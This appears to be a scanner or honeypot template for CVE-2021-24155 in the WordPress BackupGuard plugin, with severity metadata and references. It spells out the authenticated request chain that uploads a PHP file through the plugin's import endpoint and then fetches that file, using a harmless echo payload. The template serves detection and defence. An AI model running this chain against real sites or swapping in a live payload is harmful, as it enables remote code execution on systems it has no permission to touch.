id: CVE-2021-24155
info:
  name: WordPress BackupGuard <1.6.0 - Authenticated Arbitrary File Upload
  author: theamanrawat
  description: 'WordPress Backup Guard plugin before 1.6.0 is susceptible to authenticated
    arbitrary file upload. The plugin does not ensure that imported files are in SGBP
    format and extension, allowing high-privilege users to upload arbitrary files,
    including PHP, possibly leading to remote code execution.

    '
  severity: high
  impact: 'Remote code execution

    '
  remediation: Fixed in version 1.6.0.
  reference:
  - https://wpscan.com/vulnerability/d442acac-4394-45e4-b6bb-adf4a40960fb
  - https://wordpress.org/plugins/backup/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24155
  - http://packetstormsecurity.com/files/163382/WordPress-Backup-Guard-1.5.8-Shell-Upload.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cve-id: CVE-2021-24155
    cwe-id: CWE-434
    epss-score: 0.95488
    epss-percentile: 0.99234
    cpe: cpe:2.3:a:backup-guard:backup_guard:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: backup-guard
    product: backup_guard
    framework: wordpress
  tags: cve,cve2021,authenticated,wp,packetstorm,wp-plugin,rce,wordpress,backup,wpscan,intrusive,backup-guard
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-admin/admin.php?page=backup_guard_backups
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /wp-admin/admin-ajax.php?action=backup_guard_importBackup&token=
    headers:
      Accept: application/json, text/javascript, */*; q=0.01
      Content-Type: multipart/form-data; boundary=---------------------------204200867127808062083805313921
    body: |
      -----------------------------204200867127808062083805313921
      Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.php"
      Content-Type: application/x-php

      <?php

      echo "CVE-2021-24155";

      ?>

      -----------------------------204200867127808062083805313921--
  response:
    status_code: 200
    headers: {}
    body: '{"success":1}'
- request:
    method: GET
    path: /wp-content/uploads/backup-guard/.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: CVE-2021-24155
